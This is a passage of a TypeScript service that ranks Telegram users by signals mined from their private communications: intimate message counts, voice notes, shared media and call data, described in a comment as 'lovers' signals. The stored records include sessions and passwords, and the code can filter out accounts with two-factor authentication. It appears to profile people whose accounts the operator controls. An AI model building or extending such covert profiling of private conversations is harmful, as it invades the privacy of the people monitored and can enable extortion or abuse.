      this.logger.log(`[${canonicalMobile}] Relationship scoring complete: accountScore=${accountScore}, bestScore=${bestScore}, topCount=${top.length}, candidates=${candidates.length}/${candidateMap.size}`);
    } catch (error) {
      parseError(error, `[${canonicalMobile}] computeRelationshipScore failed`);
    } finally {
      if (!wasConnected && telegramClient) {
        await connectionManager.unregisterClient(canonicalMobile).catch(() => undefined);
      }
    }
  }

  async topRelationships(options: {
    page?: number;
    limit?: number;
    minScore?: number;
    gender?: string;
    excludeTwoFA?: boolean;
  }) {
    const { page = 1, limit = 20, minScore = 0, excludeTwoFA = false, gender } = options;
    const pageNum = Math.max(1, Math.floor(page));
    const limitNum = Math.min(Math.max(1, Math.floor(limit)), 100);
    const skip = (pageNum - 1) * limitNum;

    let excludedMobiles: string[] = [];
    try {
      excludedMobiles = await this.telegramService.getOwnAccountMobiles();
    } catch { }

    const query: QueryFilter<UserDocument> = {
      expired: { $ne: true },
      'relationships.bestScore': { $gt: minScore },
      ...(excludedMobiles.length > 0 && { mobile: { $nin: excludedMobiles } }),
    };
    if (excludeTwoFA) query.twoFA = { $ne: true };
    if (gender) query.gender = gender;

    const total = await this.userModel.countDocuments(query).exec();
    if (total === 0) {
      return { users: [], total: 0, page: pageNum, limit: limitNum, totalPages: 0 };
    }

    const users = await this.userModel
      .find(query)
      .select('-session -password')
      .sort({ 'relationships.bestScore': -1 })
      .skip(skip)
      .limit(limitNum)
      .allowDiskUse(true)
      .lean()
      .exec();

    return { users, total, page: pageNum, limit: limitNum, totalPages: Math.ceil(total / limitNum) };
  }

  async getUserRelationships(mobile: string) {
    const canonicalMobile = this.canonicalMobile(mobile);
    const user = await this.userModel
      .findOne({ mobile: canonicalMobile })
      .select('mobile firstName lastName tgId relationships')
      .lean()
      .exec();
    if (!user) throw new NotFoundException(`User with mobile ${mobile} not found`);
    return user;
  }

  private canonicalMobile(mobile: string): string {
    try {
      return canonicalizeMobile(mobile);
    } catch (error) {
      const message = error instanceof Error ? error.message : String(error);
      throw new BadRequestException(message);
    }
  }

  async aggregateSort(
    computedField: string,
    sortOrder: 1 | -1 = -1,
    limit: number = 20,
    skip: number = 0,
    query: QueryFilter<UserDocument> = {},
  ): Promise<any[]> {
    const COMPUTED_FIELDS: Record<string, any> = {
      intimateTotal: {
        $reduce: {
          input: { $ifNull: ['$relationships.top', []] },
          initialValue: 0,
          in: { $add: ['$$value', { $ifNull: ['$$this.intimateMessageCount', 0] }] },
        },
      },
      privateMsgsTopContacts: {
        $reduce: {
          input: { $ifNull: ['$relationships.top', []] },
          initialValue: 0,
          in: { $add: ['$$value', { $ifNull: ['$$this.messages', 0] }] },
        },
      },
      privateMediaTopContacts: {
        $reduce: {
          input: { $ifNull: ['$relationships.top', []] },
          initialValue: 0,
          in: { $add: ['$$value', { $ifNull: ['$$this.mediaCount', 0] }] },
        },
      },
      privateVoiceTotal: {
        $reduce: {
          input: { $ifNull: ['$relationships.top', []] },
          initialValue: 0,
          in: { $add: ['$$value', { $ifNull: ['$$this.voiceCount', 0] }] },
        },
      },
      privateMsgsBestContact: {
        $ifNull: [{ $arrayElemAt: ['$relationships.top.messages', 0] }, 0],
      },
      relTopIntimate: {
        $ifNull: [{ $arrayElemAt: ['$relationships.top.intimateMessageCount', 0] }, 0],
      },
      relTopMedia: {
        $ifNull: [{ $arrayElemAt: ['$relationships.top.mediaCount', 0] }, 0],
      },
      relTopVoice: {
        $ifNull: [{ $arrayElemAt: ['$relationships.top.voiceCount', 0] }, 0],
      },
      relCommonChats: {
        $ifNull: [{ $arrayElemAt: ['$relationships.top.commonChats', 0] }, 0],
      },
      relTopCalls: {
        $ifNull: [{ $arrayElemAt: ['$relationships.top.calls.total', 0] }, 0],
      },
      relMeaningfulCalls: {
        $ifNull: [{ $arrayElemAt: ['$relationships.top.calls.meaningfulCalls', 0] }, 0],
      },
      relMutualContacts: {
        $size: {
          $filter: {
            input: { $ifNull: ['$relationships.top', []] },
            as: 'r',
            cond: { $eq: ['$$r.isMutualContact', true] },
          },
        },
      },
      callPartners: {
        $size: { $ifNull: ['$calls.chats', []] },
      },
      totalPhotos: {
        $let: {
          vars: {
            splitTotal: {
              $add: [
                { $ifNull: ['$ownPhotoCount', 0] },
                { $ifNull: ['$otherPhotoCount', 0] },
              ],
            },
          },
          in: {
            $cond: [
              { $gt: ['$$splitTotal', 0] },
              '$$splitTotal',
              { $ifNull: ['$photoCount', 0] },
            ],
          },
        },
      },
      totalVideos: {
        $let: {
          vars: {
            splitTotal: {
              $add: [
                { $ifNull: ['$ownVideoCount', 0] },
                { $ifNull: ['$otherVideoCount', 0] },
              ],
            },
          },
          in: {
            $cond: [
              { $gt: ['$$splitTotal', 0] },
              '$$splitTotal',
              { $ifNull: ['$videoCount', 0] },
            ],
          },
        },
      },
      totalMedia: {
        $add: [
          {
            $let: {
              vars: {
                splitTotal: {
                  $add: [
                    { $ifNull: ['$ownPhotoCount', 0] },
                    { $ifNull: ['$otherPhotoCount', 0] },
                  ],
                },
              },
              in: {
                $cond: [
                  { $gt: ['$$splitTotal', 0] },
                  '$$splitTotal',
                  { $ifNull: ['$photoCount', 0] },
                ],
              },
            },
          },
          {
            $let: {
              vars: {
                splitTotal: {
                  $add: [
                    { $ifNull: ['$ownVideoCount', 0] },
                    { $ifNull: ['$otherVideoCount', 0] },
                  ],
                },
              },
              in: {
                $cond: [
                  { $gt: ['$$splitTotal', 0] },
                  '$$splitTotal',
                  { $ifNull: ['$videoCount', 0] },
                ],
              },
            },
          },
          { $ifNull: ['$movieCount', 0] },
        ],
      },
      totalCallDuration: {
        $reduce: {
          input: { $ifNull: ['$calls.chats', []] },
          initialValue: 0,
          in: { $add: ['$$value', { $ifNull: ['$$this.totalDuration', 0] }] },
        },
      },
      avgCallDuration: {
        $let: {
          vars: {
            durations: {
              $filter: {
                input: { $ifNull: ['$calls.chats', []] },
                as: 'call',
                cond: { $gt: [{ $ifNull: ['$$call.averageDuration', 0] }, 0] },
              },
            },
          },
          in: {
            $cond: [
              { $gt: [{ $size: '$$durations' }, 0] },
              {
                $round: [
                  {
                    $avg: {
                      $map: {
                        input: '$$durations',
                        as: 'call',
                        in: { $ifNull: ['$$call.averageDuration', 0] },
                      },
                    },
                  },
                  0,
                ],
              },
              0,
            ],
          },
        },
      },
      longestCall: {
        $reduce: {
          input: { $ifNull: ['$calls.chats', []] },
          initialValue: 0,
          in: { $max: ['$$value', { $ifNull: ['$$this.longestCall', 0] }] },
        },
      },
      missedCalls: {
        $reduce: {
          input: { $ifNull: ['$calls.chats', []] },
          initialValue: 0,
          in: { $add: ['$$value', { $ifNull: ['$$this.missed', 0] }] },
        },
      },
      privateMsgsCallPartners: {
        $reduce: {
          input: { $ifNull: ['$calls.chats', []] },
          initialValue: 0,
          in: { $add: ['$$value', { $ifNull: ['$$this.totalMessages', 0] }] },
        },
      },
    };

    const fieldExpr = COMPUTED_FIELDS[computedField];
    if (!fieldExpr) {
      throw new BadRequestException(`Unknown computed field: ${computedField}`);
    }

    const pipeline: any[] = [];
    pipeline.push({ $match: await this.getDefaultUserListQuery(query) });
    pipeline.push(
      { $addFields: { _computedSort: fieldExpr } },
      { $sort: { _computedSort: sortOrder } },
      { $skip: skip },
      { $limit: limit },
      { $project: { _computedSort: 0 } },
    );

    return this.userModel.aggregate(pipeline).allowDiskUse(true).exec();
  }

  /**
   * Signal fields usable for composite ranking, mapped to their Mongo value
   * expression. Each is verified to be populated in the data. Nested-array
   * signals are summed across relationships.top[] / calls.chats[].
   *
   * `defaultWeight` reflects how discriminating/intentful a signal is: intimate
   * and voice (rare, strong "lovers" signals) outweigh broad activity like msgs.
   */
  private static readonly COMPOSITE_SIGNALS: Record<string, { expr: any; defaultWeight: number; label: string }> = {
    relScore: { expr: { $ifNull: ['$relationships.score', 0] }, defaultWeight: 1, label: 'Relationship Score' },
    intimate: { expr: { $reduce: { input: { $ifNull: ['$relationships.top', []] }, initialValue: 0, in: { $add: ['$$value', { $ifNull: ['$$this.intimateMessageCount', 0] }] } } }, defaultWeight: 3, label: 'Intimate Messages' },
    voice: { expr: { $reduce: { input: { $ifNull: ['$relationships.top', []] }, initialValue: 0, in: { $add: ['$$value', { $ifNull: ['$$this.voiceCount', 0] }] } } }, defaultWeight: 2.5, label: 'Voice Messages' },
    media: { expr: { $reduce: { input: { $ifNull: ['$relationships.top', []] }, initialValue: 0, in: { $add: ['$$value', { $ifNull: ['$$this.mediaCount', 0] }] } } }, defaultWeight: 1.5, label: 'Shared Media' },
    calls: { expr: { $ifNull: ['$calls.totalCalls', 0] }, defaultWeight: 2, label: 'Total Calls' },
    videoCalls: { expr: { $ifNull: ['$calls.video', 0] }, defaultWeight: 2, label: 'Video Calls' },
    // Meaningful calls (real engagement, not missed/short) — summed across top
    // contacts. Strong intent signal, so weighted high. Lives under
    // relationships.top[].calls (calls.chats[].meaningfulCalls is not populated).
    meaningfulCalls: { expr: { $reduce: { input: { $ifNull: ['$relationships.top', []] }, initialValue: 0, in: { $add: ['$$value', { $ifNull: ['$$this.calls.meaningfulCalls', 0] }] } } }, defaultWeight: 2.5, label: 'Meaningful Calls' },
    callPartners: { expr: { $size: { $ifNull: ['$calls.chats', []] } }, defaultWeight: 1.5, label: 'Call Partners' },
    msgs: { expr: { $ifNull: ['$msgs', 0] }, defaultWeight: 1, label: 'Messages' },
    contacts: { expr: { $ifNull: ['$contacts', 0] }, defaultWeight: 0.5, label: 'Contacts' },
  };

  /**
   * Rank users by a WEIGHTED COMPOSITE of one or more stat signals.
   *
   * composite = Σ weight · ln(1 + value)  over the selected signals.
   * The ln(1+x) compression keeps a single huge field (e.g. media=120k) from
   * dominating signals on a smaller scale (e.g. voice). With one signal this is
   * equivalent to sorting by that field. Users with zero on every selected
   * signal are excluded. `query` is an optional pre-filter (dates/starred/etc),
   * AND-ed with the default visibility query (date operands are coerced).
   */
  async compositeRank(
    signals: Array<{ field: string; weight?: number }>,
    limit: number = 20,
    skip: number = 0,
    query: QueryFilter<UserDocument> = {},
  ): Promise<any[]> {
    if (!Array.isArray(signals) || signals.length === 0) {
      throw new BadRequestException('At least one signal is required');
    }
    const resolved = signals.map((s) => {
      const def = UsersService.COMPOSITE_SIGNALS[s.field];
      if (!def) throw new BadRequestException(`Unknown composite signal: ${s.field}`);
      const weight = (s.weight !== undefined && Number.isFinite(Number(s.weight)) && Number(s.weight) > 0)
        ? Number(s.weight)
        : def.defaultWeight;
      return { field: s.field, weight, expr: def.expr };
    });

    // Stage 1: materialize each signal's raw value into a temp field.
    const valueFields: Record<string, any> = {};
    resolved.forEach((s, i) => { valueFields[`_sig${i}`] = s.expr; });

    // Stage 2: composite = Σ weight · ln(1 + value).
    const terms = resolved.map((s, i) => ({ $multiply: [s.weight, { $ln: { $add: [1, `$_sig${i}`] } }] }));
    // Stage 3: keep only users with at least one selected signal > 0.
    const presenceOr = resolved.map((_, i) => ({ [`_sig${i}`]: { $gt: 0 } }));

    const cleanup: Record<string, 0> = { _composite: 0 };
    resolved.forEach((_, i) => { cleanup[`_sig${i}`] = 0; });

    const pipeline: any[] = [
      { $match: await this.getDefaultUserListQuery(query) },
      { $addFields: valueFields },
      { $match: { $or: presenceOr } },
      { $addFields: { _composite: { $add: terms } } },
      { $sort: { _composite: -1 } },
      { $skip: skip },
      { $limit: limit },
      { $project: { ...cleanup, session: 0, password: 0 } },
    ];

    return this.userModel.aggregate(pipeline).allowDiskUse(true).exec();
  }

  async executeQuery(
    query: QueryFilter<UserDocument>,
    sort?: Record<string, 1 | -1>,
    limit?: number,
    skip?: number,
  ): Promise<User[]> {
    if (!query) {
      throw new BadRequestException('Query is invalid.');
    }

    try {
      const listQuery = await this.getDefaultUserListQuery(query);
      const queryExec = this.userModel.find(listQuery).lean();

      if (sort) queryExec.sort(sort);
      if (limit) queryExec.limit(limit);
      if (skip) queryExec.skip(skip);

      return await queryExec.allowDiskUse(true).exec();
    } catch (error: any) {
      throw new InternalServerErrorException(error.message);
    }
  }

}
